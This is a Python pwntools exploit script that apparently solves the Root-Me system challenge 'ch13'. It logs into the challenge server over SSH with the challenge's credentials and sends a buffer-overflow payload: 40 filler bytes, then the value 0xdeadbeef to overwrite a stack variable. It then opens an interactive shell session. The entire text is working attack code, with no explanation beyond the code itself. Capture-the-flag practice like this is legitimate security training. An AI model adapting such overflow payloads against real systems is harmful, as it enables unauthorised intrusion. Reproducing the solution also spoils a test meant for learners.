#!/usr/bin/python
from pwn import *
#context.log_level='debug'

def send_payload():
    payload  = 'a'*40
    payload += p32(0xdeadbeef)
    p.sendline(payload)

if __name__=='__main__':
    local = False
    if local:
        p = process('./chall_1')
    else:
        s = ssh(host='challenge02.root-me.org', user='app-systeme-ch13', port=2222, password='app-systeme-ch13')
        p = s.run('./ch13')
    send_payload()
    p.interactive()
